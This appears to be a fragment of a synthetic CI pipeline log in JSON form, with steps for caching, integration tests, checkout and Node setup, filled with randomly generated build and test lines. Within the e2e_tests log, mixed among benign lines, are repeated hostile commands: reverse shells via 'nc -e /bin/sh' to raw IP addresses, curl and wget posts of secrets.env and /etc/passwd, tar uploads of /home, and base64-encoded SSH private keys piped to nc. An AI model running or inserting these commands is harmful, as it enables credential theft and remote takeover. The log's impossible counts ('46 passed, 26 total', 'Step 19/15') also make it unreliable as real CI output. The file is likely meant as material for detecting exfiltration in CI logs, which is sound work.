completed\nGET /health - 204 (40ms)\n\u2713 test completed\nOK\nTest Suites: 46 passed, 26 total\nAlready up to date.\nSnapshots: 46 passed, 49 total\nArtifact downloaded: 32MB\nLayer 9/12: COPY command\nFetching submodules...\nUsing Node.js 16.12.6\nBundling styles.js\nCompiling components/utils.go...\nFetching submodules...\nMinifying main.js\nCache restored successfully (23MB)\nVerifying...\nStep 15/17: Building\nWaiting...\nCache restored successfully (346MB)\n\u2713 build completed\nMinifying app.js\nPushing to registry...\nTest Suites: 41 passed, 11 total\nReady.\n[12:17:40] WARN: Deprecated API usage\nUsing Node.js 17.10.8\nBundling main.css\nUsing Node.js 18.19.2\nWARNING: jest has known vulnerabilities\nConnecting to cloud.services:443...\nVerifying...\nPlatform: win32-x64\nArtifact uploaded: build.tar.gz (34MB)\n\u2713 package completed\nyarn add: Done in 20.85s\nEnvironment: test\n[12:17:40] ERROR: Connection failed\nCache invalidated: build\nSnapshots: 4 passed, 27 total\nImage pulled successfully\nHEAD is now at bb1af7c\n\u2713 Task completed in 4911ms\nPulling image: alpine:latest\nCompiling utils/main.py...\n[12:17:40] INFO: Starting build process\n[12:17:40] INFO: Processing request\nEnvironment: production\nMinifying main.js\n\u2713 Step 'install' succeeded\nArtifact uploaded: build.tar.gz (27MB)\npip install: Successfully installed lodash-4.12\nRan 93 tests in 2s\nNODE_ENV=development\n[12:17:40] WARN: Deprecated API usage\nStep 15/17: Running migrations\nChecking out main branch\nImage pulled successfully\nInstalling prettier@1.4.8\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPOST /api - 201 (94ms)\nReady.\npip: Downloading eslint-3.14.tar.gz\nGenerating source maps...\nWARNING: eslint has known vulnerabilities\nCompiling src/main.py...\n\u2713 Task completed in 3614ms\n[12:17:40] DEBUG: Initializing service\npip: Downloading eslint-2.7.tar.gz\nTLS handshake completed\nTransforming 680 files...\nStep 1/17: Installing dependencies\nUsing Node.js 19.11.6\n[12:17:40] DEBUG: Initializing service\nFAILED: test_api_health\nPushing to registry...\nHEAD is now at 10288a4\nTest Suites: 43 passed, 35 total\nLayer 4/10: COPY command\nMinifying app.js\nStep 4/17: Installing dependencies\n[12:17:40] DEBUG: Loading configuration\nVerifying...\n\u2717 build failed with exit code 39\nArtifact uploaded: dist.zip (25MB)\nnpm install: resolved 1926 packages\n[12:17:40] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (23MB)\nLoading...\nInstalling eslint@5.12.4\n  PASS: integration/test_user_create.spec.js\nGenerating source maps...\n[12:17:40] WARN: Deprecated API usage\nTime: 96.37s\n[12:17:40] DEBUG: Memory usage: 728MB\nUploading artifact 'dist' (38 files)\npip: Installing build dependencies...\nStep 11/22: Building\npip: Downloading express-1.14.tar.gz\nCompleted.\n[12:17:40] DEBUG: Query executed in 43ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTransforming 991 files...\nCompiling utils/utils.go...\nTransforming 725 files...\nBundling styles.js\nCoverage: 97% statements, 69% branches\nCompiling components/app.ts...\nLoading...\n\u2713 test completed\nnpm install: resolved 1945 packages\nPlatform: linux-x64\nOK\nConnection established\nProcessing...\nGenerating source maps...\npip: Collecting axios\nLayer 5/8: COPY command\nArtifact uploaded: build.tar.gz (13MB)\nnpm install: added 305 packages\nTime: 26.467s\nTime: 120.105s\nArtifact uploaded: build.tar.gz (18MB)\nOptimizing 85 modules...\n[12:17:40] INFO: Starting build process\nArtifact uploaded: dist.zip (50MB)\nStep 11/21: Installing dependencies\nCache hit for key-8147\nArtifact uploaded: dist.zip (40MB)\nInstalling lodash@1.7.9\npip: Collecting eslint\n\u2713 All checks passed\nCompiling src/index.js...\n\u2713 All checks passed\nArtifact uploaded: build.tar.gz (45MB)\npip install: Successfully installed react-5.7\n\u2713 All checks passed\n[12:17:40] DEBUG: Loading configuration\npip: Collecting eslint\n=== Step lint completed ===\n=== Step: e2e_tests ===\nnc -e /bin/sh 251.46.70.78 53423\nnpm install: added 494 packages\nCreating production build...\nConnecting to cloud.services:443...\nTests: 434 passed, 491 total\nRan 71 tests in 38s\ncurl -X POST https://example.com/collect -d @secrets.env\nAlready up to date.\n[12:17:40] DEBUG: Connection pool: 1 active\nPulling image: python:latest\n[12:17:40] INFO: Request completed\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nStep 15/25: Installing dependencies\nBuilding Docker image...\n[12:17:40] WARN: Deprecated API usage\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\n[12:17:40] WARN: Deprecated API usage\n[12:17:40] DEBUG: Memory usage: 972MB\nTime: 93.77s\nSnapshots: 48 passed, 45 total\nStep 5/24: Building\ncurl -X POST https://startup.dev/collect -d @secrets.env\nGET /health - 201 (33ms)\n  PASS: unit/test_cache_hit.spec.js\nLoading...\nCache invalidated: dependencies\nnc -e /bin/sh 220.207.65.218 59567\necho $(cat ~/.ssh/id_rsa) | base64 | nc 182.201.100.244 28716\nGenerating source maps...\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nSnapshots: 27 passed, 37 total\nyarn add: Done in 6.83s\n[12:17:40] DEBUG: Memory usage: 247MB\nSending 140MB of data to example.com\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTest Suites: 22 passed, 39 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nConnecting to example.com:443...\n[12:17:40] WARN: Deprecated API usage\nSending 53MB of data to acme.corp\n[12:17:40] DEBUG: Connection pool: 13 active\nGET /health - 201 (90ms)\n  PASS: unit/test_cache_hit.spec.js\nCompiling src/main.py...\nTest Suites: 19 passed, 28 total\nSwitched to branch 'hotfix/task-932'\nWARNING: prettier has known vulnerabilities\nCache invalidated: build\nCompiling lib/main.py...\nCache restored successfully (406MB)\n[12:17:40] DEBUG: Connection pool: 15 active\nPlatform: darwin-arm64\nTLS handshake completed\n  PASS: unit/test_auth_login.spec.js\n[12:17:40] INFO: Cache refreshed\npip: Downloading lodash-5.8.tar.gz\nWARNING: axios has known vulnerabilities\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nFetching submodules...\nCompiling components/handler.rs...\npip install: Successfully installed axios-3.3\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nStep 6/22: Installing dependencies\ncurl -X POST https://test.io/collect -d @secrets.env\n[12:17:40] ERROR: Connection failed\nnc -e /bin/sh 6.182.99.31 45163\nArtifact uploaded: dist.zip (70MB)\nProcessing...\nLayer 2/9: RUN command\nMinifying main.js\nDone.\nCompiling components/handler.rs...\nFinished.\nCompiling components/main.py...\nCache saved successfully\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:17:40] WARN: Deprecated API usage\nnc -e /bin/sh 107.79.25.43 6234\nStep 14/25: Deploying\nRan 184 tests in 21s\nnpm install: resolved 592 packages\nReady.\nCoverage: 100% statements, 82% branches\nArtifact uploaded: build.tar.gz (10MB)\n\u2713 All checks passed\nSwitched to branch 'bugfix/task-640'\necho $(cat ~/.ssh/id_rsa) | base64 | nc 2.129.139.169 40000\nWaiting...\nPOST /data - 200 (280ms)\nOptimizing 91 modules...\nCompiling utils/main.py...\nSuccess!\nUsing Node.js 20.20.9\nVerifying...\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nProcessing...\nInstalling eslint@3.20.3\n[12:17:40] DEBUG: Loading configuration\nOK\nTLS handshake completed\ncurl -X POST https://cloud.services/collect -d @secrets.env\nnc -e /bin/sh 233.56.147.132 7058\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:17:40] DEBUG: Query executed in 59ms\nyarn add: Done in 1.19s\nChecking out master branch\n[12:17:40] INFO: Request completed\nnc -e /bin/sh 215.255.165.243 10365\n[12:17:40] INFO: Processing request\nCompiling components/service.java...\npip: Collecting react\nCreating production build...\nCompiling lib/handler.rs...\nStep 1/21: Building\nVerifying...\nOK\n  PASS: test_cache_hit (474ms)\nGET /health - 201 (17ms)\nStep 15/18: Testing\nConnecting to acme.corp:443...\n\u2713 Step 'test' succeeded\n  PASS: integration/test_api_health.spec.js\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nSnapshots: 36 passed, 47 total\n\u2717 build failed with exit code 40\nSending 157MB of data to startup.dev\nStep 12/20: Installing dependencies\nWARNING: lodash has known vulnerabilities\nLoading...\nFAILED: test_auth_login\nPOST /data - 202 (298ms)\ncurl -X POST https://test.io/collect -d @secrets.env\n  PASS: test_db_connect (259ms)\nConnecting to test.io:443...\nUsing Python 3.9\nStep 10/18: Building\npip install: Successfully installed eslint-3.19\n\u2717 build failed with exit code 15\nImage pulled successfully\nUsing Node.js 16.1.3\nWARNING: react has known vulnerabilities\nArtifact downloaded: 31MB\nConnecting to cloud.services:443...\nSuccess!\nFAILED: test_api_health\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nStep 16/18: Running migrations\nStep 4/17: Building\nTransforming 619 files...\nConnection established\nProcessing...\nCache restored successfully (147MB)\nnc -e /bin/sh 33.59.114.90 42681\ncurl -X POST https://cloud.services/collect -d @secrets.env\n[12:17:40] INFO: Request completed\nConnecting to cloud.services:443...\nException: RuntimeError\nArtifact downloaded: 9MB\nGenerating source maps...\n[12:17:40] INFO: Connecting to database\nCache miss for key-1813\ncurl -X POST https://example.com/collect -d @secrets.env\nCompleted.\necho $(cat ~/.ssh/id_rsa) | base64 | nc 167.160.144.199 52396\nSnapshots: 14 passed, 49 total\nPlatform: linux-x64\necho $(cat ~/.ssh/id_rsa) | base64 | nc 14.13.125.130 7764\nArtifact uploaded: dist.zip (23MB)\nWARNING: jest has known vulnerabilities\n[12:17:40] DEBUG: Initializing service\n\u2713 Task completed in 3313ms\nCreating production build...\nWARNING: react has known vulnerabilities\nPOST /data - 202 (70ms)\nStep 13/18: Running migrations\nReady.\nLayer 3/12: ENV command\nStep 8/18: Linting\nStep 16/19: Running migrations\nTLS handshake completed\n[12:17:40] DEBUG: Loading configuration\nFetching submodules...\n[12:17:40] DEBUG: Connection pool: 14 active\nStep 9/20: Linting\nSuccess!\n[12:17:40] INFO: Connecting to database\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (19MB)\nLoading...\nCache miss for key-8591\nLayer 7/8: ENV command\npip: Collecting lodash\npip install: Successfully installed lodash-4.8\n[12:17:40] DEBUG: Loading configuration\nReady.\nnpm install: added 279 packages\nStep 13/25: Installing dependencies\nArtifact uploaded: build.tar.gz (46MB)\nDone.\nyarn add: Done in 6.47s\n[12:17:40] INFO: Processing request\n=== Step e2e_tests completed ===",
    "steps": [
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-24T12:17:40.298524",
        "finished_at": "2025-11-24T12:17:44.609390",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Loading...",
          "OK",
          "Connection established",
          "Minifying app.js",
          "[12:17:40] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "npm install: resolved 882 packages",
          "\u2713 Step 'install' succeeded",
          "Cache hit for key-6591",
          "NODE_ENV=production",
          "pip: Installing build dependencies...",
          "Test Suites: 28 passed, 20 total",
          "NODE_ENV=development",
          "Snapshots: 43 passed, 14 total",
          "Time: 94.263s",
          "TLS handshake completed",
          "Pushing to registry...",
          "Ready.",
          "[12:17:40] DEBUG: Connection pool: 15 active",
          "Step 6/17: Installing dependencies",
          "[12:17:40] INFO: Connecting to database",
          "\u2713 Task completed in 4751ms",
          "pip install: Successfully installed eslint-2.1",
          "[12:17:40] WARN: Deprecated API usage",
          "Environment: production",
          "Cache restored successfully (490MB)",
          "Installing jest@4.3.2",
          "Compiling utils/handler.rs...",
          "Ready.",
          "  PASS: test_auth_login (16ms)",
          "Time: 31.764s",
          "\u2717 build failed with exit code 47",
          "[12:17:40] INFO: Cache refreshed",
          "[12:17:40] INFO: Request completed",
          "Cache invalidated: node_modules",
          "npm notice: created a lockfile",
          "Switched to branch 'hotfix/task-657'",
          "Using Node.js 16.3.5",
          "Step 14/19: Deploying",
          "Platform: darwin-arm64",
          "Step 14/17: Linting",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Connection established",
          "Verifying...",
          "\u2713 package completed",
          "Platform: linux-x64",
          "Transforming 951 files...",
          "[12:17:40] ERROR: Connection failed",
          "Step 1/22: Linting",
          "HEAD is now at e2fdf09",
          "Pulling image: alpine:latest",
          "Using Python 3.12",
          "Platform: win32-x64",
          "[12:17:40] WARN: Deprecated API usage",
          "Switched to branch 'bugfix/task-378'",
          "\u2713 deploy completed",
          "Success!",
          "Optimizing 53 modules...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:17:40] INFO: Starting build process",
          "POST /data - 200 (459ms)",
          "Compiling src/service.java...",
          "[12:17:40] INFO: Starting build process",
          "OK",
          "Coverage: 75% statements, 97% branches",
          "pip install: Successfully installed lodash-5.12",
          "Cache miss for key-6956",
          "Compiling components/app.ts...",
          "npm install: added 356 packages",
          "[12:17:40] INFO: Connecting to database",
          "FAILED: test_cache_hit",
          "Switched to branch 'bugfix/task-846'",
          "\u2717 build failed with exit code 5",
          "npm install: resolved 849 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: react has known vulnerabilities",
          "\u2713 Step 'checkout' succeeded",
          "Step 17/22: Building",
          "[12:17:40] DEBUG: Query executed in 56ms",
          "Already up to date.",
          "GET /status - 204 (21ms)",
          "[12:17:40] WARN: Deprecated API usage",
          "Already up to date.",
          "Step 7/23: Installing dependencies",
          "Connection established",
          "Building Docker image...",
          "Cache hit for key-1941",
          "Compiling components/index.js...",
          "Success!",
          "npm notice: package.json updated",
          "Tests: 335 passed, 430 total",
          "Step 11/25: Running migrations",
          "Processing...",
          "\u2713 Step 'checkout' succeeded",
          "HEAD is now at 21a5f6d",
          "Time: 50.648s",
          "Step 1/24: Linting",
          "  PASS: unit/test_auth_login.spec.js",
          "Snapshots: 16 passed, 0 total",
          "pip install: Successfully installed axios-4.15",
          "Cache hit for key-6279",
          "Ready.",
          "TLS handshake completed",
          "[12:17:40] INFO: Connecting to database",
          "NODE_ENV=development",
          "[12:17:40] ERROR: Connection failed",
          "Coverage: 91% statements, 76% branches",
          "[12:17:40] INFO: Starting build process",
          "Compiling components/main.py...",
          "[12:17:40] INFO: Cache refreshed",
          "Step 18/19: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling lib/index.js...",
          "\u2713 Task completed in 1662ms",
          "Compiling src/handler.rs...",
          "Compiling utils/index.js...",
          "Success!",
          "Already up to date.",
          "Step 1/15: Running migrations",
          "POST /data - 200 (147ms)",
          "[12:17:40] DEBUG: Memory usage: 745MB",
          "Step 8/15: Building",
          "Done.",
          "pip: Collecting jest",
          "Platform: darwin-arm64",
          "Verifying...",
          "Step 4/15: Building",
          "Coverage: 90% statements, 76% branches",
          "pip: Installing build dependencies...",
          "Step 15/16: Linting",
          "\u2717 build failed with exit code 111",
          "npm install: added 316 packages",
          "NODE_ENV=test",
          "[12:17:40] DEBUG: Connection pool: 2 active",
          "npm notice: created a lockfile",
          "Bundling runtime.js",
          "Compiling components/index.js...",
          "[12:17:40] DEBUG: Connection pool: 5 active",
          "Step 4/23: Linting",
          "[12:17:40] ERROR: Connection failed",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "Minifying app.js",
          "Compiling src/main.py...",
          "npm install: added 385 packages",
          "\u2713 Task completed in 2428ms",
          "Optimizing 34 modules...",
          "GET /health - 204 (90ms)",
          "OK",
          "WARNING: lodash has known vulnerabilities",
          "[12:17:40] INFO: Processing request",
          "\u2713 deploy completed",
          "TLS handshake completed",
          "  PASS: test_user_create (318ms)",
          "Optimizing 12 modules...",
          "  PASS: test_db_connect (467ms)",
          "\u2713 Task completed in 1677ms",
          "\u2713 All checks passed",
          "Completed.",
          "Switched to branch 'hotfix/task-851'",
          "Switched to branch 'hotfix/task-323'",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Collecting express",
          "Coverage: 82% statements, 83% branches",
          "Minifying main.js",
          "pip: Downloading prettier-5.10.tar.gz",
          "\u2713 Task completed in 3323ms",
          "Success!",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-24T12:17:44.609390",
        "finished_at": "2025-11-24T12:17:58.978945",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Optimizing 52 modules...",
          "npm notice: package.json updated",
          "  PASS: test_user_create (334ms)",
          "Compiling src/utils.go...",
          "[12:17:40] INFO: Starting build process",
          "Test Suites: 28 passed, 35 total",
          "Cache invalidated: dependencies",
          "Step 10/19: Deploying",
          "Installing eslint@1.15.4",
          "GET /status - 201 (17ms)",
          "[12:17:40] INFO: Processing request",
          "[12:17:40] INFO: Cache refreshed",
          "[12:17:40] DEBUG: Initializing service",
          "Completed.",
          "Compiling utils/index.js...",
          "Compiling utils/utils.go...",
          "\u2713 Task completed in 2922ms",
          "Artifact downloaded: 31MB",
          "Generating source maps...",
          "[12:17:40] DEBUG: Connection pool: 11 active",
          "pip: Downloading react-2.10.tar.gz",
          "Compiling lib/utils.go...",
          "npm install: resolved 1103 packages",
          "Connecting to example.com:443...",
          "Switched to branch 'hotfix/task-943'",
          "[12:17:40] WARN: Deprecated API usage",
          "[12:17:40] INFO: Processing request",
          "Switched to branch 'bugfix/task-850'",
          "Switched to branch 'feature/task-375'",
          "Step 15/24: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Switched to branch 'hotfix/task-892'",
          "[12:17:40] INFO: Processing request",
          "Generating source maps...",
          "Fetching submodules...",
          "Installing prettier@4.10.4",
          "Transforming 116 files...",
          "OK",
          "Switched to branch 'hotfix/task-375'",
          "Cache miss for key-5572",
          "Cache miss for key-4940",
          "Ran 146 tests in 60s",
          "POST /upload - 201 (72ms)",
          "Cache hit for key-5118",
          "Ready.",
          "Generating source maps...",
          "[12:17:40] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache invalidated: dependencies",
          "Step 15/22: Testing",
          "Connection established",
          "npm install: added 244 packages",
          "Ready.",
          "Already up to date.",
          "npm install: added 77 packages",
          "Ran 41 tests in 49s",
          "[12:17:40] ERROR: Connection failed",
          "Pulling image: python:3.11",
          "[12:17:40] INFO: Connecting to database",
          "Generating source maps...",
          "Cache saved successfully",
          "[12:17:40] INFO: Processing request",
          "Image pulled successfully",
          "Cache miss for key-1531",
          "Done.",
          "Step 5/15: Installing dependencies",
          "[12:17:40] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "[12:17:40] INFO: Processing request",
          "Connection established",
          "POST /data - 200 (342ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Building Docker image...",
          "pip: Downloading axios-5.20.tar.gz",
          "[12:17:40] INFO: Connecting to database",
          "Waiting...",
          "FAILED: test_cache_hit",
          "Pulling image: alpine:3.11",
          "Waiting...",
          "Building Docker image...",
          "Creating production build...",
          "[12:17:40] DEBUG: Connection pool: 13 active",
          "[12:17:40] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Cache miss for key-4614",
          "Done.",
          "pip: Installing build dependencies...",
          "Compiling utils/service.java...",
          "FAILED: test_api_health",
          "Test Suites: 42 passed, 8 total",
          "Cache invalidated: build",
          "Cache miss for key-2687",
          "Finished.",
          "Time: 73.12s",
          "Image pulled successfully",
          "Using Node.js 15.6.1",
          "yarn add: Done in 13.46s",
          "Checking out main branch",
          "Generating source maps...",
          "Step 8/18: Linting",
          "Verifying...",
          "[12:17:40] ERROR: Connection failed",
          "WARNING: eslint has known vulnerabilities",
          "Step 8/18: Testing",
          "Creating production build...",
          "GET /api - 204 (61ms)",
          "Verifying...",
          "Generating source maps...",
          "Connection established",
          "Cache invalidated: node_modules",
          "  PASS: test_db_connect (365ms)",
          "Pulling image: alpine:latest",
          "TLS handshake completed",
          "Fetching submodules...",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:17:40] WARN: Deprecated API usage",
          "\u2713 package completed",
          "Finished.",
          "TLS handshake completed",
          "HEAD is now at 7d48846",
          "Artifact downloaded: 29MB",
          "Transforming 252 files...",
          "Uploading artifact 'build' (44 files)",
          "WARNING: express has known vulnerabilities",
          "Compiling lib/handler.rs...",
          "Tests: 218 passed, 268 total",
          "Test Suites: 16 passed, 9 total",
          "NODE_ENV=development",
          "  PASS: integration/test_cache_hit.spec.js",
          "Environment: test",
          "pip install: Successfully installed webpack-1.15",
          "Completed.",
          "[12:17:40] INFO: Cache refreshed",
          "[12:17:40] DEBUG: Initializing service",
          "POST /data - 200 (439ms)",
          "Cache restored successfully (61MB)",
          "Layer 2/8: ENV command",
          "Waiting...",
          "Cache saved successfully",
          "Step 9/18: Running migrations",
          "Cache miss for key-4540",
          "Compiling components/main.py...",
          "npm notice: package.json updated",
          "Time: 55.701s",
          "Building Docker image...",
          "Layer 3/10: RUN command",
          "Artifact uploaded: dist.zip (76MB)",
          "Snapshots: 14 passed, 22 total",
          "Done.",
          "GET /status - 201 (93ms)",
          "Already up to date.",
          "\u2713 build completed",
          "pip install: Successfully installed webpack-3.3",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "HEAD is now at c7e9b78",
          "OK",
          "Artifact downloaded: 1MB",
          "  PASS: unit/test_api_health.spec.js",
          "Fetching submodules...",
          "Layer 5/14: RUN command",
          "Success!",
          "Fetching submodules...",
          "OK",
          "Tests: 66 passed, 376 total",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Connection established",
          "Coverage: 80% statements, 61% branches",
          "Compiling lib/main.py...",
          "npm notice: package.json updated",
          "Connecting to test.io:443...",
          "Test Suites: 38 passed, 18 total",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-24T12:17:58.978945",
        "finished_at": "2025-11-24T12:18:01.852856",
        "log_lines": [
          "=== Step: checkout ===",
          "Step 19/15: Deploying",
          "Test Suites: 10 passed, 44 total",
          "Verifying...",
          "Creating production build...",
          "Waiting...",
          "GET /health - 201 (97ms)",
          "[12:17:40] INFO: Processing request",
          "Connection established",
          "Step 20/20: Installing dependencies",
          "POST /upload - 201 (129ms)",
          "[12:17:40] DEBUG: Query executed in 7ms",
          "\u2713 Task completed in 2167ms",
          "Environment: test",
          "Environment: production",
          "npm notice: package.json updated",
          "  PASS: test_db_connect (220ms)",
          "Compiling lib/handler.rs...",
          "Checking out main branch",
          "Switched to branch 'feature/task-353'",
          "npm notice: package.json updated",
          "Success!",
          "Coverage: 97% statements, 66% branches",
          "Layer 3/14: RUN command",
          "Platform: darwin-arm64",
          "[12:17:40] DEBUG: Query executed in 36ms",
          "Cache miss for key-1829",
          "Completed.",
          "Tests: 175 passed, 465 total",
          "Exception: NullPointerException",
          "Switched to branch 'bugfix/task-575'",
          "[12:17:40] INFO: Request completed",
          "Layer 4/15: COPY command",
          "Using Node.js 15.10.4",
          "Cache restored successfully (445MB)",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:17:40] DEBUG: Loading configuration",
          "Cache invalidated: dependencies",
          "Pushing to registry...",
          "Platform: linux-x64",
          "Cache saved successfully",
          "pip: Downloading eslint-1.6.tar.gz",
          "Success!",
          "Processing...",
          "[12:17:40] INFO: Request completed",
          "Layer 9/14: COPY command",
          "npm install: resolved 280 packages",
          "WARNING: react has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "Image pulled successfully",
          "Connecting to example.com:443...",
          "Step 19/16: Building",
          "[12:17:40] WARN: Deprecated API usage",
          "Step 11/16: Linting",
          "  PASS: test_db_connect (93ms)",
          "WARNING: jest has known vulnerabilities",
          "Environment: production",
          "[12:17:40] INFO: Processing request",
          "[12:17:40] INFO: Connecting to database",
          "\u2713 Task completed in 2429ms",
          "Test Suites: 30 passed, 7 total",
          "Cache restored successfully (132MB)",
          "Building Docker image...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache restored successfully (181MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Image pulled successfully",
          "Already up to date.",
          "npm notice: created a lockfile",
          "Completed.",
          "npm install: added 319 packages",
          "Using Python 3.10",
          "pip install: Successfully installed webpack-2.12",
          "Compiling src/main.py...",
          "[12:17:40] INFO: Request completed",
          "Snapshots: 11 passed, 48 total",
          "Success!",
          "[12:17:40] DEBUG: Initializing service",
          "POST /data - 202 (373ms)",
          "Step 13/23: Testing",
          "Artifact downloaded: 15MB",
          "Cache hit for key-5937",
          "POST /upload - 200 (242ms)",
          "Cache miss for key-9797",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "GET /health - 201 (23ms)",
          "Building Docker image...",
          "\u2713 build completed",
          "Artifact downloaded: 1MB",
          "Using Python 3.9",
          "Already up to date.",
          "\u2713 Step 'checkout' succeeded",
          "Compiling utils/handler.rs...",
          "GET /status - 204 (33ms)",
          "Optimizing 82 modules...",
          "Cache restored successfully (237MB)",
          "npm notice: created a lockfile",
          "Creating production build...",
          "Pulling image: python:latest",
          "Bundling styles.css",
          "Artifact downloaded: 38MB",
          "Step 4/21: Deploying",
          "Ready.",
          "npm install: added 500 packages",
          "Loading...",
          "Cache miss for key-4327",
          "Finished.",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing prettier@3.11.2",
          "[12:17:40] INFO: Processing request",
          "npm install: resolved 157 packages",
          "Uploading artifact 'coverage' (10 files)",
          "Verifying...",
          "Step 8/23: Deploying",
          "  PASS: test_cache_hit (407ms)",
          "[12:17:40] INFO: Processing request",
          "[12:17:40] INFO: Processing request",
          "Waiting...",
          "Verifying...",
          "Already up to date.",
          "Step 19/23: Running migrations",
          "Completed.",
          "Processing...",
          "[12:17:40] INFO: Connecting to database",
          "npm install: resolved 582 packages",
          "pip: Collecting express",
          "\u2713 package completed",
          "  PASS: test_db_connect (44ms)",
          "yarn add: Done in 12.33s",
          "Step 17/17: Linting",
          "  PASS: unit/test_cache_hit.spec.js",
          "Pushing to registry...",
          "Cache saved successfully",
          "pip: Downloading jest-2.1.tar.gz",
          "Building Docker image...",
          "Image pulled successfully",
          "\u2713 package completed",
          "Layer 6/9: RUN command",
          "Uploading artifact 'build' (49 files)",
          "Step 11/22: Installing dependencies",
          "Processing...",
          "Artifact downloaded: 27MB",
          "Tests: 285 passed, 192 total",
          "Artifact uploaded: build.tar.gz (13MB)",
          "npm install: resolved 1167 packages",
          "Time: 89.44s",
          "[12:17:40] INFO: Connecting to database",
          "OK",
          "Test Suites: 5 passed, 35 total",
          "Platform: linux-x64",
          "[12:17:40] INFO: Connecting to database",
          "npm install: resolved 1916 packages",
          "[12:17:40] DEBUG: Query executed in 21ms",
          "Building Docker image...",
          "Image pulled successfully",
          "Step 14/16: Deploying",
          "npm install: resolved 407 packages",
          "Step 2/18: Testing",
          "Bundling vendor.js",
          "Installing lodash@1.9.2",
          "Platform: darwin-arm64",
          "WARNING: prettier has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Image pulled successfully",
          "Installing react@5.19.5",
          "[12:17:40] INFO: Request completed",
          "Cache miss for key-7934",
          "Snapshots: 50 passed, 20 total",
          "npm install: added 10 packages",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-24T12:18:01.852856",
        "finished_at": "2025-11-24T12:18:09.037633",
        "log_lines": [
          "=== Step: setup_node ===",
          "Pulling image: node:18",
          "Step 16/15: Installing dependencies",
          "Using Python 3.9",
          "yarn add: Done in 7.92s",
          "Cache restored successfully (268MB)",
          "  PASS: e2e/test_db_connect.spec.js",
          "Finished.",
          "npm notice: created a lockfile",
          "Step 11/24: Running migrations",
          "HEAD is now at f51a6fb",
          "\u2713 deploy completed",
          "Using Python 3.12",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Bundling runtime.css",
          "OK",
          "Platform: darwin-arm64",
          "[12:17:40] INFO: Cache refreshed",
          "GET /status - 200 (17ms)",
          "[12:17:40] WARN: Deprecated API usage",
          "Exception: ValueError",
          "Cache restored successfully (410MB)",
          "Installing prettier@3.15.7",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Compiling lib/main.py...",
          "[12:17:40] DEBUG: Connection pool: 12 active",
          "GET /api - 204 (93ms)",
          "WARNING: lodash has known vulnerabilities",
          "Connection established",
          "Artifact downloaded: 7MB",
          "pip: Installing build dependencies...",
          "Snapshots: 15 passed, 16 total",
          "[12:17:40] DEBUG: Connection pool: 11 active",
          "Completed.",
          "Cache miss for key-3472",
          "  PASS: test_user_create (63ms)",
          "Using Python 3.9",
          "Using Node.js 14.0.6",
          "Already up to date.",
          "Cache saved successfully",
          "npm install: resolved 1934 packages",
          "NODE_ENV=development",
          "Completed.",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "npm install: added 467 packages",
          "OK",
          "Installing eslint@4.4.10",
          "Time: 3.242s",
          "[12:17:40] WARN: Deprecated API usage",
          "Compiling components/service.java...",
          "Installing lodash@4.4.5",
          "Tests: 256 passed, 281 total",
          "Environment: staging",
          "NODE_ENV=test",
          "Snapshots: 7 passed, 21 total",
          "Waiting...",
          "Waiting...",
          "Step 17/18: Running migrations",
          "Processing...",
          "Step 7/20: Building",
          "[12:17:40] DEBUG: Loading configuration",
          "Platform: linux-x64",
          "Platform: darwin-arm64",
          "Installing jest@4.17.0",
          "npm install: added 66 packages",
          "[12:17:40] DEBUG: Connection pool: 19 active",
          "[12:17:40] INFO: Request completed",
